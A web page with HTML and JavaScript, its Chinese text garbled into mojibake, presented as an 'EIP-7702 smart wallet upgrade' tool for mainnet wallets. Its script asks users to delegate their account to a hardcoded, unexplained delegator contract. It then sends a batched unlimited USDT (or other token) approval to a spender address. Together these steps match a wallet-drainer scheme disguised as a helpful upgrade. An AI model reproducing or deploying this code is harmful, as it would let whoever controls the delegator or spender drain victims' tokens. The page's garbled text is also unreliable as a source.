<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EIP-7702 æ™ºèƒ½é’±åŒ…å‡çº§ & æ‰§2è¡Œ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            min-height: 100vh;
            padding: 30px 20px;
            color: #fff;
        }
        .container {
            max-width: 700px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 8px;
            font-size: 26px;
            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle {
            text-align: center;
            color: #888;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .card {
            background: rgba(255,255,255,0.05);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
        }
        .card-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .step-number {
            width: 28px;
            height: 28px;
            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #aaa;
            font-size: 14px;
        }
        select, input {
            width: 100%;
            padding: 14px;
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.2);
            background: rgba(0,0,0,0.3);
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s;
        }
        select:focus, input:focus {
            border-color: #00d2ff;
        }
        select option {
            background: #1a1a2e;
        }
        .btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .btn-connect {
            background: linear-gradient(135deg, #f093fb, #f5576c);
        }
        .btn-connect:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.3);
        }
        .btn-upgrade {
            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
        }
        .btn-upgrade:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 210, 255, 0.3);
        }
        .btn-execute {
            background: linear-gradient(135deg, #11998e, #38ef7d);
        }
        .btn-execute:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(56, 239, 125, 0.3);
        }
        .status {
            padding: 12px 16px;
            border-radius: 10px;
            margin-top: 15px;
            font-size: 14px;
            display: none;
        }
        .status.show {
            display: block;
        }
        .status.success {
            background: rgba(56, 239, 125, 0.15);
            border: 1px solid rgba(56, 239, 125, 0.3);
            color: #38ef7d;
        }
        .status.error {
            background: rgba(255, 107, 107, 0.15);
            border: 1px solid rgba(255, 107, 107, 0.3);
            color: #ff6b6b;
        }
        .status.info {
            background: rgba(0, 210, 255, 0.15);
            border: 1px solid rgba(0, 210, 255, 0.3);
            color: #00d2ff;
        }
        .status.warning {
            background: rgba(255, 193, 7, 0.15);
            border: 1px solid rgba(255, 193, 7, 0.3);
            color: #ffc107;
        }
        .wallet-info {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 15px;
            background: rgba(0,0,0,0.2);
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .wallet-avatar {
            width: 45px;
            height: 45px;
            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
        }
        .wallet-details {
            flex: 1;
        }
        .wallet-address {
            font-family: monospace;
            font-size: 14px;
            color: #00d2ff;
        }
        .wallet-balance {
            font-size: 13px;
            color: #888;
            margin-top: 4px;
        }
        .chain-badge {
            padding: 6px 12px;
            background: rgba(255,255,255,0.1);
            border-radius: 20px;
            font-size: 12px;
        }
        .info-box {
            padding: 15px;
            background: rgba(255, 193, 7, 0.1);
            border-left: 3px solid #ffc107;
            border-radius: 0 10px 10px 0;
            margin-bottom: 20px;
            font-size: 13px;
            color: #ccc;
            line-height: 1.6;
        }
        .hidden {
            display: none !important;
        }
        .loading {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .tx-hash {
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            margin-top: 8px;
            padding: 10px;
            background: rgba(0,0,0,0.2);
            border-radius: 6px;
        }
        .tx-hash a {
            color: #00d2ff;
            text-decoration: none;
        }
        .tx-hash a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>EIP-7702 æ™ºèƒ½é’±åŒ…</h1>
        <p class="subtitle">å‡çº§ EOA ä¸ºæ™ºèƒ½è´¦æˆ· & æ‰§è¡Œæ‰¹é‡æ“ä½œ</p>

        <!-- Step 1: è¿æ¥é’±åŒ… -->
        <div class="card" id="step1">
            <div class="card-title">
                <span class="step-number">1</span>
                è¿æ¥é’±åŒ…
            </div>

            <div class="form-group">
                <label>é€‰æ‹©ç½‘ç»œ</label>
                <select id="chainSelect">
                    <option value="1">Ethereum Mainnet</option>
                    <option value="56">BNB Smart Chain</option>
                    <option value="137">Polygon</option>
                    <option value="11155111">Sepolia Testnet</option>
                </select>
            </div>

            <button class="btn btn-connect" id="connectBtn" onclick="connectWallet()">
                ğŸ”— è¿æ¥é’±åŒ…
            </button>

            <div class="status" id="connectStatus"></div>
        </div>

        <!-- é’±åŒ…ä¿¡æ¯ -->
        <div class="card hidden" id="walletCard">
            <div class="wallet-info">
                <div class="wallet-avatar">ğŸ‘›</div>
                <div class="wallet-details">
                    <div class="wallet-address" id="walletAddress">-</div>
                    <div class="wallet-balance" id="walletBalance">-</div>
                </div>
                <div class="chain-badge" id="chainBadge">-</div>
            </div>
        </div>

        <!-- Step 2: å‡çº§é’±åŒ… -->
        <div class="card hidden" id="step2">
            <div class="card-title">
                <span class="step-number">2</span>
                å‡çº§ä¸ºæ™ºèƒ½é’±åŒ…
            </div>

            <div class="info-box">
                âš ï¸ <strong>æ³¨æ„ï¼š</strong>EIP-7702 ç›®å‰æ”¯æŒæœ‰é™ã€‚å¦‚æœå‡çº§å¤±è´¥ï¼Œè¯·ä½¿ç”¨ TokenPocket æˆ– OKX æ‰‹æœºé’±åŒ…è¿›è¡Œå‡çº§ã€‚
            </div>

            <div class="form-group">
                <label>Delegator åˆçº¦åœ°å€</label>
                <input type="text" id="delegatorAddress" value="0xcc0c946EecF01A4Bc768c333Ea74CEb04756f17b" placeholder="0x...">
            </div>

            <button class="btn btn-upgrade" id="upgradeBtn" onclick="upgradeWallet()">
                â¬†ï¸ å‡çº§é’±åŒ…
            </button>

            <div class="status" id="upgradeStatus"></div>
        </div>

        <!-- Step 3: æ‰§è¡Œæ“ä½œ -->
        <div class="card hidden" id="step3">
            <div class="card-title">
                <span class="step-number">3</span>
                æ‰§è¡Œæˆæƒæ“ä½œ
            </div>

            <div class="form-group">
                <label>ä»£å¸åˆçº¦</label>
                <select id="tokenSelect">
                    <option value="auto">è‡ªåŠ¨é€‰æ‹© USDT</option>
                    <option value="custom">è‡ªå®šä¹‰ä»£å¸</option>
                </select>
            </div>

            <div class="form-group hidden" id="customTokenGroup">
                <label>ä»£å¸åœ°å€</label>
                <input type="text" id="customToken" placeholder="0x...">
            </div>

            <div class="form-group">
                <label>æˆæƒç»™ (Spender)</label>
                <input type="text" id="spenderAddress" placeholder="è¾“å…¥è¦æˆæƒçš„åˆçº¦åœ°å€ 0x...">
            </div>

            <button class="btn btn-execute" id="executeBtn" onclick="executeApprove()">
                âœ… æ‰§è¡Œæˆæƒ
            </button>

            <div class="status" id="executeStatus"></div>
        </div>
    </div>

    <script>
        // ============== é…ç½® ==============
        const CHAIN_CONFIG = {
            1: {
                name: 'Ethereum',
                usdt: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                explorer: 'https://etherscan.io/tx/',
                rpc: 'https://eth.llamarpc.com'
            },
            56: {
                name: 'BSC',
                usdt: '0x55d398326f99059fF775485246999027B3197955',
                explorer: 'https://bscscan.com/tx/',
                rpc: 'https://bsc-dataseed.binance.org'
            },
            137: {
                name: 'Polygon',
                usdt: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
                explorer: 'https://polygonscan.com/tx/',
                rpc: 'https://polygon-rpc.com'
            },
            11155111: {
                name: 'Sepolia',
                usdt: '0x0000000000000000000000000000000000000000',
                explorer: 'https://sepolia.etherscan.io/tx/',
                rpc: 'https://rpc.sepolia.org'
            }
        };

        let provider = null;
        let signer = null;
        let userAddress = null;
        let currentChainId = null;

        // ============== è·å–é’±åŒ… Provider ==============
        function getProvider() {
            // imToken é’±åŒ…
            if (window.imToken) {
                console.log('æ£€æµ‹åˆ° imToken é’±åŒ…');
                return window.ethereum || window.imToken;
            }
            // TokenPocket é’±åŒ…
            if (window.tokenpocket || window.isTokenPocket) {
                console.log('æ£€æµ‹åˆ° TokenPocket é’±åŒ…');
                return window.ethereum;
            }
            // OKX é’±åŒ…
            if (window.okxwallet) {
                console.log('æ£€æµ‹åˆ° OKX é’±åŒ…');
                return window.okxwallet;
            }
            // Trust Wallet
            if (window.trustwallet) {
                console.log('æ£€æµ‹åˆ° Trust Wallet');
                return window.trustwallet;
            }
            // Coinbase Wallet
            if (window.coinbaseWalletExtension) {
                console.log('æ£€æµ‹åˆ° Coinbase Wallet');
                return window.coinbaseWalletExtension;
            }
            // BitKeep / Bitget
            if (window.bitkeep) {
                console.log('æ£€æµ‹åˆ° BitKeep é’±åŒ…');
                return window.bitkeep.ethereum;
            }
            // é€šç”¨ ethereum provider
            if (window.ethereum) {
                console.log('æ£€æµ‹åˆ° ethereum provider');
                return window.ethereum;
            }
            return null;
        }

        // ============== è¿æ¥é’±åŒ… ==============
        async function connectWallet() {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('connectStatus');
            const targetChainId = document.getElementById('chainSelect').value;

            try {
                btn.disabled = true;
                btn.innerHTML = '<span class="loading"></span> è¿æ¥ä¸­...';

                // è·å–é’±åŒ… provider
                provider = getProvider();

                if (!provider) {
                    throw new Error('æœªæ£€æµ‹åˆ°é’±åŒ…ï¼Œè¯·ä½¿ç”¨ imToken / TokenPocket / OKX / MetaMask ç­‰é’±åŒ…æ‰“å¼€æ­¤é¡µé¢');
                }

                // è¯·æ±‚è¿æ¥
                let accounts;
                try {
                    // æ ‡å‡†æ–¹å¼
                    accounts = await provider.request({
                        method: 'eth_requestAccounts'
                    });
                } catch (e) {
                    // å¤‡ç”¨æ–¹å¼ï¼ˆå…¼å®¹æ—§ç‰ˆé’±åŒ…ï¼‰
                    accounts = await provider.enable();
                }

                if (!accounts || accounts.length === 0) {
                    throw new Error('æœªæˆæƒä»»ä½•è´¦æˆ·');
                }

                userAddress = accounts[0];

                // åˆ‡æ¢ç½‘ç»œ
                try {
                    await provider.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x' + parseInt(targetChainId).toString(16) }]
                    });
                } catch (switchError) {
                    // å¦‚æœç½‘ç»œä¸å­˜åœ¨ï¼Œå¯èƒ½éœ€è¦æ·»åŠ 
                    console.log('åˆ‡æ¢ç½‘ç»œå¤±è´¥:', switchError);
                }

                // è·å–å½“å‰é“¾ ID
                let chainIdHex;
                try {
                    chainIdHex = await provider.request({ method: 'eth_chainId' });
                } catch (e) {
                    // å¤‡ç”¨æ–¹å¼
                    chainIdHex = provider.chainId;
                }
                currentChainId = parseInt(chainIdHex, 16);

                // è·å–ä½™é¢
                let balance;
                try {
                    balance = await provider.request({
                        method: 'eth_getBalance',
                        params: [userAddress, 'latest']
                    });
                } catch (e) {
                    balance = '0x0';
                }
                const balanceEth = parseInt(balance, 16) / 1e18;

                // æ›´æ–° UI
                document.getElementById('walletCard').classList.remove('hidden');
                document.getElementById('walletAddress').textContent =
                    userAddress.slice(0, 8) + '...' + userAddress.slice(-6);
                document.getElementById('walletBalance').textContent =
                    balanceEth.toFixed(4) + ' ' + (currentChainId === 56 ? 'BNB' : currentChainId === 137 ? 'MATIC' : 'ETH');
                document.getElementById('chainBadge').textContent =
                    CHAIN_CONFIG[currentChainId]?.name || 'Chain ' + currentChainId;

                document.getElementById('step2').classList.remove('hidden');
                document.getElementById('step3').classList.remove('hidden');

                showStatus(status, 'success', 'âœ… é’±åŒ…å·²è¿æ¥');
                btn.innerHTML = 'âœ… å·²è¿æ¥';

            } catch (error) {
                showStatus(status, 'error', 'âŒ ' + error.message);
                btn.innerHTML = 'ğŸ”— è¿æ¥é’±åŒ…';
                btn.disabled = false;
            }
        }

        // ============== å‡çº§é’±åŒ… ==============
        async function upgradeWallet() {
            const btn = document.getElementById('upgradeBtn');
            const status = document.getElementById('upgradeStatus');
            const delegator = document.getElementById('delegatorAddress').value.trim();

            if (!delegator || !/^0x[a-fA-F0-9]{40}$/.test(delegator)) {
                showStatus(status, 'error', 'âŒ è¯·è¾“å…¥æœ‰æ•ˆçš„ Delegator åœ°å€');
                return;
            }

            try {
                btn.disabled = true;
                btn.innerHTML = '<span class="loading"></span> å‡çº§ä¸­...';

                // å°è¯•å‘é€ EIP-7702 äº¤æ˜“
                // æ³¨æ„ï¼šå¤§å¤šæ•°é’±åŒ…ç›®å‰ä¸æ”¯æŒ type: 4 äº¤æ˜“

                const txParams = {
                    from: userAddress,
                    to: userAddress,
                    value: '0x0',
                    data: '0x',
                    // EIP-7702 ç‰¹æ®Šå­—æ®µï¼ˆé’±åŒ…å¯èƒ½ä¸æ”¯æŒï¼‰
                    type: '0x04',
                    authorizationList: [{
                        chainId: '0x' + currentChainId.toString(16),
                        address: delegator,
                        nonce: '0x0',
                    }]
                };

                // å°è¯•å‘é€
                try {
                    const txHash = await provider.request({
                        method: 'eth_sendTransaction',
                        params: [txParams]
                    });

                    showStatus(status, 'success',
                        'âœ… å‡çº§äº¤æ˜“å·²å‘é€ï¼<div class="tx-hash"><a href="' +
                        CHAIN_CONFIG[currentChainId]?.explorer + txHash +
                        '" target="_blank">' + txHash + '</a></div>'
                    );
                    btn.innerHTML = 'âœ… å‡çº§æˆåŠŸ';

                } catch (txError) {
                    // å¤§å¤šæ•°é’±åŒ…ä¼šåœ¨è¿™é‡Œå¤±è´¥
                    if (txError.code === 4001) {
                        throw new Error('ç”¨æˆ·å–æ¶ˆäº†äº¤æ˜“');
                    }

                    // é’±åŒ…ä¸æ”¯æŒ EIP-7702
                    showStatus(status, 'warning',
                        'âš ï¸ å½“å‰é’±åŒ…ä¸æ”¯æŒ EIP-7702 äº¤æ˜“<br><br>' +
                        'è¯·ä½¿ç”¨ä»¥ä¸‹æ–¹å¼å‡çº§ï¼š<br>' +
                        '1. TokenPocket æ‰‹æœº App<br>' +
                        '2. OKX Wallet æ‰‹æœº App<br>' +
                        '3. Rabby Wallet<br><br>' +
                        'å‡çº§åå›åˆ°æ­¤é¡µé¢æ‰§è¡Œæ“ä½œ'
                    );
                    btn.innerHTML = 'â¬†ï¸ å‡çº§é’±åŒ…';
                    btn.disabled = false;
                }

            } catch (error) {
                showStatus(status, 'error', 'âŒ ' + error.message);
                btn.innerHTML = 'â¬†ï¸ å‡çº§é’±åŒ…';
                btn.disabled = false;
            }
        }

        // ============== æ‰§è¡Œæˆæƒ ==============
        async function executeApprove() {
            const btn = document.getElementById('executeBtn');
            const status = document.getElementById('executeStatus');
            const spender = document.getElementById('spenderAddress').value.trim();

            // è·å–ä»£å¸åœ°å€
            let tokenAddress;
            if (document.getElementById('tokenSelect').value === 'auto') {
                tokenAddress = CHAIN_CONFIG[currentChainId]?.usdt;
                if (!tokenAddress || tokenAddress === '0x0000000000000000000000000000000000000000') {
                    showStatus(status, 'error', 'âŒ å½“å‰ç½‘ç»œæ²¡æœ‰é¢„è®¾ USDT åœ°å€ï¼Œè¯·é€‰æ‹©è‡ªå®šä¹‰ä»£å¸');
                    return;
                }
            } else {
                tokenAddress = document.getElementById('customToken').value.trim();
            }

            // éªŒè¯
            if (!tokenAddress || !/^0x[a-fA-F0-9]{40}$/.test(tokenAddress)) {
                showStatus(status, 'error', 'âŒ è¯·è¾“å…¥æœ‰æ•ˆçš„ä»£å¸åœ°å€');
                return;
            }
            if (!spender || !/^0x[a-fA-F0-9]{40}$/.test(spender)) {
                showStatus(status, 'error', 'âŒ è¯·è¾“å…¥æœ‰æ•ˆçš„æˆæƒåœ°å€');
                return;
            }

            try {
                btn.disabled = true;
                btn.innerHTML = '<span class="loading"></span> æ‰§è¡Œä¸­...';

                // æ„å»º calldata
                const calldata = buildApproveCalldata(tokenAddress, spender);

                // å‘é€äº¤æ˜“
                const txHash = await provider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: userAddress,  // å‘ç»™è‡ªå·±ï¼ˆæ™ºèƒ½é’±åŒ…æ‰§è¡Œï¼‰
                        value: '0x0',
                        data: calldata,
                        gas: '0x30000'  // çº¦ 200000
                    }]
                });

                showStatus(status, 'success',
                    'âœ… æˆæƒäº¤æ˜“å·²å‘é€ï¼<div class="tx-hash"><a href="' +
                    CHAIN_CONFIG[currentChainId]?.explorer + txHash +
                    '" target="_blank">' + txHash + '</a></div>'
                );
                btn.innerHTML = 'âœ… æ‰§è¡ŒæˆåŠŸ';

            } catch (error) {
                if (error.code === 4001) {
                    showStatus(status, 'error', 'âŒ ç”¨æˆ·å–æ¶ˆäº†äº¤æ˜“');
                } else {
                    showStatus(status, 'error', 'âŒ ' + error.message);
                }
                btn.innerHTML = 'âœ… æ‰§è¡Œæˆæƒ';
                btn.disabled = false;
            }
        }

        // ============== æ„å»º Calldata ==============
        function buildApproveCalldata(tokenAddress, spenderAddress) {
            const token = tokenAddress.slice(2).toLowerCase();
            const spender = spenderAddress.slice(2).toLowerCase();

            const parts = [
                '0x34fcd5be',
                '0000000000000000000000000000000000000000000000000000000000000020',
                '0000000000000000000000000000000000000000000000000000000000000001',
                '0000000000000000000000000000000000000000000000000000000000000020',
                '000000000000000000000000' + token,
                '0000000000000000000000000000000000000000000000000000000000000000',
                '0000000000000000000000000000000000000000000000000000000000000060',
                '0000000000000000000000000000000000000000000000000000000000000044',
                '095ea7b3',
                '000000000000000000000000' + spender,
                'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
                '00000000000000000000000000000000000000000000000000000000'
            ];

            return parts.join('');
        }

        // ============== å·¥å…·å‡½æ•° ==============
        function showStatus(element, type, message) {
            element.className = 'status show ' + type;
            element.innerHTML = message;
        }

        // ç›‘å¬ä»£å¸é€‰æ‹©
        document.getElementById('tokenSelect').addEventListener('change', function() {
            const customGroup = document.getElementById('customTokenGroup');
            if (this.value === 'custom') {
                customGroup.classList.remove('hidden');
            } else {
                customGroup.classList.add('hidden');
            }
        });

        // ç›‘å¬è´¦æˆ·å˜åŒ–
        function setupWalletListeners() {
            const p = getProvider();
            if (p && p.on) {
                p.on('accountsChanged', function(accounts) {
                    if (accounts.length === 0) {
                        location.reload();
                    } else {
                        userAddress = accounts[0];
                        document.getElementById('walletAddress').textContent =
                            userAddress.slice(0, 8) + '...' + userAddress.slice(-6);
                    }
                });

                p.on('chainChanged', function() {
                    location.reload();
                });
            }
        }

        // é¡µé¢åŠ è½½æ—¶è®¾ç½®ç›‘å¬
        setupWalletListeners();
    </script>
</body>
</html>
